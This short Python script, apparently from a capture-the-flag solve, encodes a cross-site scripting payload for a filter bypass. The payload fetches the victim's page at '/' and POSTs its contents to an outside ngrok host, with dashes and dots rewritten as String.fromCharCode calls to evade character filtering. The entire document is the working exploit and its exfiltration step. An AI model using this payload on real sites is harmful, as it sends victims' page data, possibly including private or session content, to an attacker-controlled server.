from based91 import decode
print(''.join([f'{byte:02x}' for byte in decode('<script>fetch(`/`)[`then`](r=>r[`text`]()[`then`](a=>fetch(`https://bce4-96-22-137-37.ngrok-free.app`,{method:`POST`,body:a,mode:`no-cors`,headers:{[`ngrok-skip-browser-warning`]:1}})))</script>ab'.replace('-','${String["fromCharCode"](45)}').replace('.','${String["fromCharCode"](46)}'))]))
